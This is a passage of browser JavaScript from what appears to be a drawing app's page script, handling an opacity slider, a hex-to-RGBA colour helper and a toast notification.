const opacitySlider = document.getElementById('opacitySlider');
const opacityVal    = document.getElementById('opacityVal');
opacitySlider.addEventListener('input', () => {
  opacity = +opacitySlider.value / 100; opacityVal.textContent = opacitySlider.value + '%';
  opacitySlider.style.setProperty('--pct2', ((+opacitySlider.value - 5) / 95 * 100).toFixed(1) + '%');
});
sizeSlider.style.setProperty('--pct', '11.9%');
opacitySlider.style.setProperty('--pct2', '89.5%');
/* ═══════════════════════════════════════
   UTILS
═══════════════════════════════════════ */
function hexToRgba(hex, a) {
  const r = parseInt(hex.slice(1,3),16), g = parseInt(hex.slice(3,5),16), b = parseInt(hex.slice(5,7),16);
  return `rgba(${r},${g},${b},${a})`;
}
let toastTimer;
function toast(msg, type = '') {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.className = type ? `show ${type}` : 'show';
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => el.classList.remove('show'), 3000);
}
</script>
